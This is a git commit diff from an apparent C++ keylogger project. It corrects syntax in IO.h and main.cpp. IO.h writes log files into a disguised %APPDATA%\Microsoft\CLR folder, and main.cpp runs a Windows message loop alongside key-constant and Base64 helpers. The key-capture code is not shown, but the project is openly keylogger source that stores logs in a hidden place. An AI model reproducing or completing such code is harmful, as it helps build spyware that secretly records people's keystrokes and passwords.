9d507db95845662781a331b2791031cf3962a243
DESKTOP-8M0J74Q\User <nwy140@gmail.com>
2018-01-06 19:27:01 +0800

    Created Timer.h which uses chrono to get system time

--- Keylogger/IO.h
+++ Keylogger/IO.h
@@ -5,23 +5,22 @@
  #include <cstdlib>
  #include <fstream>
  #include <windows.h>
- #include "Helper.h"
- #include "Base64.h"
 
- namspace IO //Input Output
+
+ namespace IO //Input Output
  {
      std::string GetOurPath(const bool append_seperator = false)
      {      //output path C:\Users\USERNAME\AppData\Roaming
          std::string appdata_dir(getenv("APPDATA")); //get environmental variable which contains the APPDATA directory
-     }  std::string full=appdata_dir + "\\Microsoft\\CLR";
+       std::string full=appdata_dir + "\\Microsoft\\CLR";
      return full + ( append_seperator ? "\\" : ""); //if append_seperator is true "\\" , else ""
-
+     }
     bool MkOneDr (std::string path)
     {
         return (bool) CreateDirectory(path.c_str(),NULL)
          || GetLastError() == ERROR_ALREADY_EXISTS;
     }
-    bool MKDir(std::string Path)
+    bool MKDir(std::string path)
     {
         for (char &c : path)
             {
@@ -30,13 +29,13 @@
                         c='\0'; //turns c to null
                         if (!MkOneDr(path))
                         return false;
-                        c = '\\'
+                        c = '\\';
                 }
                 return true;
             }
     }
     template <class T>
-    std::string Write Log(const T &t)
+    std::string WriteLog(const T &t)
     {
         std::string path = GetOurPath(true);
         Helper::DateTime dt;
--- Keylogger/main.cpp
+++ Keylogger/main.cpp
@@ -1,9 +1,9 @@
-
 #include <iostream>
 #include <windows.h>
 #include "Helper.h"
 #include "KeyConstants.h"
 #include "Base64.h"
+#include "IO.h"
 
 using namespace std;
 
@@ -11,14 +11,9 @@ int main()
 {
 	MSG Msg; //This is a message to be processed but it will never be processed
 
-	while (GetMessage(&Msg, NULL, 0, 0) ) {
+	while (GetMessage(&Msg, NULL, 0, 0) ) { //Main Thread
 		TranslateMessage(&Msg);
 		DispatchMessage(&Msg);
 	}
-
-
-	cout << "HEY THERE"; cout<<"work man";
-
-    return 0;
+    return 0    ;
 }
-
